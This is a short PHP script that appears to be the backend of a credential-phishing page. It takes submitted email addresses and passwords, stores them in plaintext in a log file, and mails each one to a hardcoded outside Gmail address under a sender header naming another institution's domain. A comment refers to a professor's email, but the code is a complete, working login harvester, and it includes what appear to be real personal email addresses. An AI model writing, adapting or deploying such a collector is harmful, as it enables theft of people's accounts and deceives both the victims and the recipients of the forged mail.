<?php
header('Content-Type: application/json');

// Allow only POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Invalid request method.']);
    exit;
}

// Check for required fields
if (empty($_POST['email']) || empty($_POST['password'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing email or password.']);
    exit;
}

// Sanitize input
$email = filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL);
$password = trim($_POST['password']);

// Format message
$timestamp = date('Y-m-d H:i:s');
$message = "Login Attempt:\nTime: $timestamp\nEmail: $email\nPassword: $password\n";

// Optional: Save to log.txt as well
file_put_contents('log.txt', $message . PHP_EOL, FILE_APPEND);

// ✅ Send email
$to = 'virginio.frattarelli1@gmail.com';  // 👈 change this to your professor’s real email
$subject = "Login Attempt from $email";
$headers = "From: i2cloud72 <akotsi@certh.gr>\r\n";  // Optional: set from address

if (mail($to, $subject, $message, $headers)) {
    echo json_encode(['success' => true, 'message' => 'Email sent']);
} else {
    echo json_encode(['success' => false, 'message' => 'Failed to send email']);
}
?>
